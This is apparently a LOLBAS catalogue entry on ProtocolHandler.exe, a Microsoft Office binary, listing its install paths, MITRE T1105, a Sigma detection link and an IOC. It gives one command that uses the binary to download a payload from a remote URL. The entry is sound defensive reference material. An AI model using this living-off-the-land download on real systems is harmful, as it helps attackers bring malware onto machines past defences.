---
Acknowledgement:
- Person: Nir Chako (Pente
Author: Nir Chako
Commands:
- Category: Download
  Command: ProtocolHandler.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: It will open the specified URL in the default web browser, which (if the
    URL points to a file) will often result in the file being downloaded to the user's
    Downloads folder (without user interaction)
Created: 2022-07-24
Description: Microsoft Office binary
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe
Name: ProtocolHandler.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# ProtocolHandler.exe

Microsoft Office binary

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe`
- `C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe`

# Download Commands

Downloads payload from remote server

```batch
ProtocolHandler.exe {REMOTEURL}
```

- **Usecase:** It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Nir Chako (Authored, 2022-07-24)
- Nir Chako (Pente